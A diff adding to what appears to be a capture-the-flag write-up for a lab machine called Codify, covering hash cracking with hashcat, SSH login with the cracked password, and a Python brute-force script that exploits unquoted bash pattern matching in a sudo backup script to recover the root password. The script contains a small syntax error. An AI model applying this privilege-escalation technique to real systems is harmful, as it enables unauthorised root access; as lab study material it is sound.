@@ -171,3 +171,117 @@ svc@codify:~$ ^Z
 svc@codify:~$ export TERM=xterm
 svc@codify:~$ 
 ```
+
+In linpeas i noticed this directory in www
+
+![image](https://github.com/p3ta00/MasterNotes/assets/128841823/9fec3646-380a-43b0-b35b-841b5a2a55c8)
+
+And a tickets.db file existed
+![image](https://github.com/p3ta00/MasterNotes/assets/128841823/85c62d02-f3da-4d69-9912-f00096477d21)
+
+transfer the file to your linux machine. 
+
+![image](https://github.com/p3ta00/MasterNotes/assets/128841823/11f07dc3-6b37-421f-8d30-24529bfd4fe1)
+I didn't have to transfer the file after all. 
+
+## Hashcat
+```
+hashcat -m 3200 hash.txt /home/p3ta/tools/wordlists/rockyou.txt
+```
+```
+$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
+```
+## SSH
+```
+❯ ssh joshua@10.10.11.239
+joshua@10.10.11.239's password
+```
+Get a proper shell with 
+```
+export TERM=xterm
+```
+
+### Sudo -L
+```
+joshua@codify:~$ sudo -l
+[sudo] password for joshua: 
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh
+```
+### mysql-backup.sh
+```
+joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
+#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+    /usr/bin/echo "Backing up database: $db"
+    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'
+```
+
+## Exploiting the Script
+The right side of the == in a bash script is not quoted, Bash will perform pattern matching instead of treating it as a string
+
+```
+import string
+import subprocess
+
+all_characters_and_numbers = list(string.ascii_letters + string.digits)
+
+password = ""
+found = False
+
+while not found:
+    for character in all_characters_and_numbers:
+        command = f"echo '{password}{character}*' | sudo {path/to/file/"
+        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+
+        if "Password confirmed!" in output:
+            password += character
+            print(password)
+            break
+    else:
+        found = True
+        print(password)
+```
+
+## Vulnerability to Brute Force:
+
+The script you initially shared does not limit the number of attempts a user can make to enter the correct password. This lack of rate limiting or account lockout mechanisms makes it susceptible to brute-force attacks, like the one attempted by the Python script.
+## Feedback for Each Guess:
+
+The script confirms when a part of the password is correct ("Password confirmed!"). This feedback can be used by an attacker to incrementally guess the entire password, as demonstrated by the Python script.
+
+## Execution Context:
+
+The Python script requires the ability to execute the targeted script (sudo {path/to/file}). If the Python script can run this command (especially with sudo), it indicates that the execution environment is already compromised to a degree, as the Python script has significant privileges.
+
+# Root
+![image](https://github.com/p3ta00/MasterNotes/assets/128841823/a4e6ce12-d256-4b4b-a66c-de47b9a9ae11)
